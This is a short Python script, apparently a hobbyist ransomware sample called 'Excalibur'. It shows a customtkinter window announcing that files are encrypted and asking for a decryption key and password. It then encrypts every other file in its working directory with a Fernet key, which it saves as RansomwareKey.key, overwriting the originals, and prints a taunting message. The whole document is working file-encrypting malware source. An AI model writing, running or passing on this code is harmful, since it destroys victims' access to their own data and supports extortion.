#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import customtkinter


#GUI
customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("blue")

root = customtkinter.CTk()
root.geometry("500x350")


print ("Files Encrypted")

frame = customtkinter.CTkFrame(master=root)
frame.pack(pady=20, padx=60, fill="both", expand=True)

label = customtkinter.CTkLabel(master=frame, text="Files have been encrypted", font=("Roboto",24))
label.pack(pady=12, padx=10)

label = customtkinter.CTkLabel(master=frame, text="Use the Decryption key and password to recover them :(", font=("Roboto",14))
label.pack(pady=12, padx=10)

root.mainloop()

#find files to encrypt

files = []
for file in os.listdir():
	if file == "Excalibur.py" or file == "RansomwareKey.key" or file == "Decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print (files)

key = Fernet.generate_key()
with open("RansomwareKey.key","wb") as RansomwareKey:
	RansomwareKey.write(key) 

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open (file, "wb") as thefile:
		thefile.write(contents_encrypted)

print ("Oh, dang! I accidently encrypted all your files :(")
